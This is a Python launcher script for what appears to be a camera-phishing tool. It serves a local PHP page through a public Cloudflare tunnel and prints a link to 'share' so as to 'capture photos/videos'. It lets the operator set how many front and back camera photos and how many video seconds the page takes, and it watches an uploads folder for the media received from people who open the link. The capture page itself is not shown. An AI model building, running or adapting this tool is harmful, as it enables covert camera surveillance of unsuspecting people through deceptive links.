import subprocess,time,re,shutil,sys,os,random
from datetime import datetime
try:
    from watchdog.observers import Observer
    from watchdog.events import FileSystemEventHandler
except:
    os.system('pip install watchdog')
try:
    from colorama import init,Fore
except:
    os.system('pip install colorama')

init()  


colors = {
    "red": '\033[00;31m',
    "green": '\033[00;32m',
    "light_green": '\033[01;32m',
    "yellow": '\033[01;33m',
    "light_red": '\033[01;31m',
    "blue": '\033[94m',
    "purple": '\033[01;35m',
    "cyan": '\033[00;36m',
    "grey": '\033[90m',
    "reset": Fore.RESET,
}

messages = {
    "true": f"{colors['red']}[{colors['light_green']}+{colors['red']}] {colors['light_green']}",
    "forindex": f"{colors['red']}[{colors['green']}?{colors['red']}] {colors['green']}",
    "error": f"{colors['red']}[{colors['light_red']}-{colors['red']}] {colors['light_red']}"
}

PHP_PORT = random.randint(8000,8999)
PHP_FOLDER = "./"  
FOLDER_TO_WATCH = "uploads"
INDEX = "index.html"
# -------------------------------------------------------------------

def clear():
    os.system("clear || cls")

def OS():
    return os.path.exists("/data/data/com.termux")

clear()

if not shutil.which("php"):
    if OS():
        subprocess.run(["pkg", "install", "php"])
    elif 'Linux' in __import__("platform").system():
        subprocess.run(["sudo", "apt", "install","php"])
    print(f"\n{messages['error']}Php is NOT installed!\n\nInstall On Windows: https://www.php.net/downloads.php")

if not shutil.which("cloudflared"):
    sys.exit(f"\n{messages['error']}'cloudflared' is NOT installed!\n\nInstall On Linux: \nwget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb\nsudo dpkg -i cloudflared-linux-amd64.deb\n\nInstall On Windows: \nwinget install cloudflare.cloudflared\n\nInstall On Termux: \npkg install cloudflared\n\nMore info: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/")
    
user = os.popen("whoami").read().strip()
os.environ["USER"] = user

if OS():
    os.environ["HOME"] = os.environ.get("HOME") 
    b = f"""{colors['cyan']}                                                                                           
▄█████  ▄▄▄  ▄▄   ▄▄ █████▄ ▄▄ ▄▄ ▄▄  ▄▄▄▄ ▄▄ ▄▄ 
██     ██▀██ ██▀▄▀██ ██▄▄█▀ ██▄██ ██ ███▄▄ ██▄██ 
▀█████ ██▀██ ██   ██ ██     ██ ██ ██ ▄▄██▀ ██ ██ 

    {colors['red']}Tg&Git: @c2-tlhah{colors['reset']}\n\n                                       
"""
else:
    if 'Linux' in __import__("platform").system():
        os.environ["HOME"] = f"/home/{user}"
    b = f"""{colors['cyan']}
       _..._                                                                                          
    .-'_..._''.                                                                                       
  .' .'      '.\          __  __   ___  _________   _...._        .        .--.           .           
 / .'                    |  |/  `.'   `.\        |.'      '-.   .'|        |__|         .'|           
. '                      |   .-.  .-.   '\        .'```'.    '.<  |        .--.        <  |           
| |                 __   |  |  |  |  |  | \      |       \     \| |        |  |         | |           
| |              .:--.'. |  |  |  |  |  |  |     |        |    || | .'''-. |  |     _   | | .'''-.    
. '             / |   \ ||  |  |  |  |  |  |      \      /    . | |/.'''. \|  |   .' |  | |/.'''. \   
 \ '.          .`" __ | ||  |  |  |  |  |  |     |\`'-.-'   .'  |  /    | ||  |  .   | /|  /    | |   
  '. `._____.-'/ .'.''| ||__|  |__|  |__|  |     | '-....-'`    | |     | ||__|.'.'| |//| |     | |   
    `-.______ / / /   | |_                .'     '.             | |     | |  .'.'.-'  / | |     | |   
             `  \ \._,\ '/              '-----------'           | '.    | '. .'   \_.'  | '.    | '.  
                 `--'  `"                                       '---'   '---'           '---'   '---' 

                {colors['red']}Tg&Git: @c2-tlhah{colors['reset']}\n\n                                       
                 """

print (b)

forindex = input(f"{messages['forindex']}Do you want to change the settings of the 'index.html' file? (y/n): {colors['reset']}").upper()

if forindex == "Y":
    front_photo_count = input(f"{messages['forindex']}Front Photo Count {colors['yellow']}(e.g: 3){colors['reset']}: ")
    back_photo_count = input(f"{messages['forindex']}Back Photo Count {colors['yellow']}(e.g: 3){colors['reset']}: ")
    front_video_seconds = input(f"{messages['forindex']}Front Video Seconds {colors['yellow']}(e.g: 5){colors['reset']}: ")
    back_video_seconds = input(f"{messages['forindex']}Back Video Seconds {colors['yellow']}(e.g: 4){colors['reset']}: ")
    patterns = {
        'frontPhotoCount': r'let frontPhotoCount = \d+;',
        'backPhotoCount': r'let backPhotoCount = \d+;',
        'frontVideoSeconds': r'let frontVideoSeconds = \d+;',
        'backVideoSeconds': r'let backVideoSeconds = \d+;'
    }

    with open(INDEX, 'r', encoding='utf-8') as file:
        content = file.read()

    content = re.sub(patterns['frontPhotoCount'], f'let frontPhotoCount = {front_photo_count};', content)
    content = re.sub(patterns['backPhotoCount'], f'let backPhotoCount = {back_photo_count};', content)
    content = re.sub(patterns['frontVideoSeconds'], f'let frontVideoSeconds = {front_video_seconds};', content)
    content = re.sub(patterns['backVideoSeconds'], f'let backVideoSeconds = {back_video_seconds};', content)

    with open(INDEX, 'w', encoding='utf-8') as file:
        file.write(content)
    clear
    print(b)

def php_server():
    print(f"{messages['true']}Starting PHP server on port {colors['yellow']}{PHP_PORT}{colors['reset']}...")
    php_proc = subprocess.Popen(
        ["php", "-S", f"0.0.0.0:{PHP_PORT}"],
        cwd=PHP_FOLDER,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    time.sleep(2)
    return php_proc

def cloudflared_tunnel(port):
    """Starts a cloudflared tunnel and extracts the public URL."""
    print(f"{messages['true']}Starting Cloudflare tunnel on port {colors['yellow']}{port}{colors['reset']}...")
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    
    tunnel_proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    
    # Read output to find the public URL
    url_found = False
    for line in iter(tunnel_proc.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', line)
        if match:
            url = match.group(0)
            print(f"\n{messages['true']}Public URL: {colors['yellow']}{url}{colors['reset']}")
            print(f"{messages['true']}Share this URL to capture photos/videos!\n")
            url_found = True
            break
    
    if not url_found:
        print(f"{messages['error']}Could not extract Cloudflare URL. Check if cloudflared is properly installed.")
    
    return tunnel_proc

class WatcherHandler(FileSystemEventHandler):
    def on_created(self, event):
        if not event.is_directory:
            file_name = os.path.basename(event.src_path)
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"\n{messages['true']}File received: {colors['green']}{file_name} {colors['red']}at {colors['yellow']}{current_time}")

if __name__ == "__main__":

    php_proc = php_server()
    tunnel_proc = cloudflared_tunnel(PHP_PORT)

    event_handler = WatcherHandler()
    observer = Observer()
    observer.schedule(event_handler, FOLDER_TO_WATCH, recursive=False)
    observer.start()
    print(f"{messages['true']}Photo capture Started => {colors['yellow']}{FOLDER_TO_WATCH}\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{colors['red']}Stopping servers and observer...")
        php_proc.terminate()
        tunnel_proc.terminate()
        observer.stop()

        observer.join()
